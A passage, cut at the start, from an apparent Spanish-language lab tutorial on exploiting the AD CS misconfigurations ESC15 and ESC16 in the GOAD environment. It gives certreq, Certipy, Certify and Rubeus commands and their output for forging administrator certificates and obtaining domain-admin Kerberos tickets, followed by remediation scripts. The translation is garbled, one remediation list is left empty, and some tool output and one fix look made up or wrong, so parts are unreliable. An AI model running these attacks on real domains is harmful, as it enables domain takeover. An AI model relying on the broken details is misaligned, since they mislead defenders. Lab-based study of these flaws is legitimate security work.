Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!
```

**Método alternativo (Dirección de la Política de Aplicación Directa):**

ESC15 Explotación Ejemplo - Método 1: Uso de certreq con archivo INF personalizado:

```bash
$infContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.5.5.7.3.2"
2.5.29.17 = "{text}upn=administrator@essos.local"
"@

$infContent | Out-File -FilePath "esc15.inf"
```

```bash
certreq -new -f esc15.inf esc15.req
certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15.req

Certificate Request Processor: The request is taken under submission Request ID = 19
```

Método 2: Utilizando Certipy v5.0o (si está disponible con soporte ESC15)

`certipy req -u missandei@essos.local -p fr3edom -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local -upn administrator@essos.local -key-size 2048`

El ataque funciona porque las plantillas de la versión 1 no validan extensiones de la Política de Aplicación y Políticas de Aplicación anulan el uso de llave extendida cuando ambos están presentes

Recuperar el certificado expedido:

`certreq -retrieve 19 esc15.cer` `certreq -accept esc15.cer`

El certificado expedido contendrá ambos:

- EKU original: Atentación al servidor
- Política de aplicaciones: Aventicación cliente (priva precedencia)

Verificar el contenido del certificado

```bash
certutil -dump esc15.cer | findstr -i "application\|enhanced"

Application Policies:
    [1]Application Policy:
         Policy Identifier=Client Authentication
         Policy Qualifier Info:
              Policy Qualifier Id=CPS
              Qualifier:
                   http://braavos.essos.local/CertEnroll/ESSOS-CA_CPS.html

Enhanced Key Usage:
    Server Authentication (1.3.6.1.5.5.7.3.1)

# Authenticate using certificate - Application Policy overrides EKU
Rubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Certificate Application Policy overrides EKU: Client Authentication
[+] TGT request successful!
```

ESC15 también se puede armar para ataques de Agente de Solicitud de Certificados. Crear el archivo INF para la capacidad de agente de solicitud de certificados:

```bash
$craInfContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.4.1.311.20.2.1"
"@

$craInfContent | Out-File -FilePath "esc15-cra.inf"
```

`certreq -new -f esc15-cra.inf esc15-cra.req` `certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15-cra.req`

Ahora podemos solicitar certificados en nombre de otros usuarios.

### Plantillas por defecto vulnerables

Todas las plantillas de la versión 1 son potencialmente vulnerables cuando se conceden derechos de inscripción en GOAD:

- **WebServer** (más comúnmente explotado) . Encontrado en GOAD
- Ningún usuario de cambio
- CEPEncryption
- OfflineRouter
- IPSECIntermediateOffline
- SubCA
- CA
- MatrículaAgentOffline

### Remediación

**Microsoft ha parcheado esta vulnerabilidad a partir del 12 de noviembre de 2024 (CVE-2024-49019).** Otras medidas de protección incluyen:

# ESC16: La eliminación de la extensión de seguridad CA-Wide

**Estado: ACTIVE THREAT**

ESC16 representa una configuración errónea crítica cuando la Autoridad de Certificados está configurada para omitir el `szOID_NTDS_CA_SECURITY_EXT`extensión (OID: `1.3.6.1.4.1.311.25.2`) en cada certificado que emite.

### Detalles técnicos

ESC16 surge cuando la CA se configura para **omitir** el `szOID_NTDS_CA_SECURITY_EXT`extensión en cada certificado que emite. Sin esta extensión, un certificado ya no incluye el SID de la cuenta, rompiendo la fuerte unión de certificado a cuenta impuesta por Windows Server 2022 y posterior (KB5014754).

**Diferencia clave con ESC9:**

- **ESC9** : Las plantillas individuales carecen del requisito de extensión de seguridad
- **ESC16** : La propia CA está configurada para nunca incluir la extensión de seguridad, afectando a TODOS los certificados independientemente de la plantilla

### Condiciones de vulnerabilidad

1. **CA EditFlags modificadas** para eliminar `require_sidisupport`
2. **Eliminación de la extensión de seguridad mundial** que afecta a todos los certificados expedidos
3. **Cualquier plantilla con autenticación del cliente** EKU se convierte en explotable

### Detección

Revisemos ESC16 en nuestro entorno GOAD. Certipy v5 detecta ESC16 durante la enumeración:

```bash
certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -target braavos.essos.local

Certipy v5.0.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Finding certificate authority configurations
[*] Found 1 certificate authority configuration

[!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!
    This makes ALL certificates vulnerable to impersonation attacks.
    
    CA Name                         : ESSOS-CA
    DNS Hostname                    : braavos.essos.local
    Certificate Subject             : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number       : 43000000119278B092E51688A600000000000011
    Certificate Validity Start      : 2023-01-15 14:14:32+00:00
    Certificate Validity End        : 2033-01-15 14:24:32+00:00
    Security Extension Enforcement  : DISABLED (ESC16 VULNERABLE!)

# Check CA configuration manually
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x80000 (524288)
```

Busque las banderas EDITFABABLEDEFAULTSMIME (0x10000) o banderas similares que hagan cumplir la extensión de seguridad. Si EditFlags muestra que la CA ha sido configurada para saltarse las extensiones de seguridad, ESC16 está presente.

### Explotación

Con ESC16, CUALQUIER solicitud de certificado se vuelve peligrosa:

```bash
# ESC16 makes even restricted templates exploitable
# Request certificate from a normally "safe" template
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 20

# Due to ESC16, the certificate lacks the security extension
# even though the template might normally include it

# Convert and use for authentication
openssl pkcs12 -in cert.pem -export -out admin_esc16.pfx -password pass:mimikatz

# Authentication succeeds despite missing security extension

Rubeus.exe asktgt /user:administrator /certificate:admin_esc16.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful! - ESC16 allows impersonation without SID binding

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 7:45:30 PM
  EndTime                  : 1/4/2025 5:45:30 AM
  RenewTill                : 1/10/2025 7:45:30 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
```

### Remediación

**Arreglar inmediatamente:**

```bash
# Re-enable security extension requirement on GOAD CA
# Method 1: Remove szOID_NTDS_CA_SECURITY_EXT from DisableExtensionList (Recommended)
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"

CertUtil: -setreg command completed successfully.

# Method 2: Alternative approach using EDITF_ENABLEDEFAULTSMIME (also effective)
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ENABLEDEFAULTSMIME

# Restart Certificate Services
Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services

# Enable Strong Certificate Binding Enforcement on Domain Controllers
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\Parameters" -Name "StrongCertificateBindingEnforcement" -Value 2
Restart-Service kdc

# This ensures DCs reject certificates lacking the szOID_NTDS_CA_SECURITY_EXT extension

# Verify the fix
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList

# The DisableExtensionList should no longer contain 1.3.6.1.4.1.311.25.2
```

**Hardening a largo plazo:**

```bash
# Import required PowerShell module
Import-Module ActiveDirectory

# Audit all CAs in GOAD environment for ESC16
$goadCAs = @(
    "braavos.essos.local\ESSOS-CA",
    "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA", 
    "winterfell.north.sevenkingdoms.local\NORTH-CA"
)

foreach ($ca in $goadCAs) {
    Write-Host "[*] Checking CA: $ca for ESC16"
    
    try {
        $disableExtList = certutil -config $ca -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList
        
        # Check if szOID_NTDS_CA_SECURITY_EXT is in the disable list
        if ($disableExtList -match "1\.3\.6\.1\.4\.1\.311\.25\.2") {
            Write-Warning "[!] ESC16 detected on CA: $ca"
            Write-Warning "    szOID_NTDS_CA_SECURITY_EXT is disabled"
            
            # Fix the misconfiguration by removing the OID from DisableExtensionList
            certutil -config $ca -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"
            Write-Host "[+] Fixed ESC16 on CA: $ca"
        } else {
            Write-Host "[+] CA $ca is not vulnerable to ESC16"
        }
    }
    catch {
        Write-Warning "[-] Failed to check CA: $ca"
    }
}

[*] Checking CA: braavos.essos.local\ESSOS-CA for ESC16
[!] ESC16 detected on CA: braavos.essos.local\ESSOS-CA
    szOID_NTDS_CA_SECURITY_EXT is disabled
[+] Fixed ESC16 on CA: braavos.essos.local\ESSOS-CA

[*] Checking CA: kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA for ESC16
[+] CA kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA is not vulnerable to ESC16
```

## Referencias y lectura adicional

Esta guía se basa en una investigación pionera de la comunidad de seguridad, con todos los ejemplos demostrados en el entorno del laboratorio de GOAD (Juego de Directorio Activo):

1. [SpecterOps, "Certified Pre-Owned: Abusing Active Directory Certificate Services" (2021)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
2. [TrustedSec, "EKUwu: No sólo otro AD CS ESC (ESC15)" (octubre de 2024)](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
3. [Munib Nawaz, "AD CS ESC16: Misconfiguration and Exploitation", Medium (25 de mayo de 2025)](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
4. [Certipy Wiki, "06 - Privilege Escalation (ESC1-ESC16) ", GitHub (abril de 2025)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
5. [Soporte de Microsoft, "KB5014754: Cambios de autenticación basados en certificados en los controladores de dominio de Windows" (10 de mayo de 2022)](https://support.microsoft.com/help/5014754)
6. [Microsoft Learn, "Edit vulnerable Certificate Authority settings (ESC6)" (marzo de 2025)](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-certificate-signing)
7. [Orange Cyberdefense, "GOAD: Game of Active Directory" (2024-2025)](https://github.com/Orange-Cyberdefense/GOAD)
8. [PKINITtools (Dirk-Jan Máller) GitHub (2024-2025)](https://github.com/dirkjanm/PKINITtools)
9. [Impacket Project Repository (2023-2025)](https://github.com/SecureAuthCorp/impacket)
10. [EKUwu: No es sólo otro CES AD CS - TrustedSec](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
11. [CVE-2024-49019 - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019)

### Herramientas y recursos:

- [Certify v1.1.0 (2022-11-08)](https://github.com/GhostPack/Certify)
- [Certipy v5.0](https://github.com/ly4k/Certipy)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [Impacket v0.11.0](https://github.com/SecureAuthCorp/impacket)
- [GOAD Lab Environment](https://github.com/Orange-Cyberdefense/GOAD)
- [ForgeCert](https://github.com/GhostPack/ForgeCert)

Para la última investigación de ADCS, monitore:

- [SpecterOps Blog](https://posts.specterops.io/)
- [TrustedSec Blog](https://trustedsec.com/blog/)
- [Centro de Respuesta de Seguridad de Microsoft](https://msrc.microsoft.com/)
- [Certipy Wiki](https://github.com/ly4k/Certipy/wiki)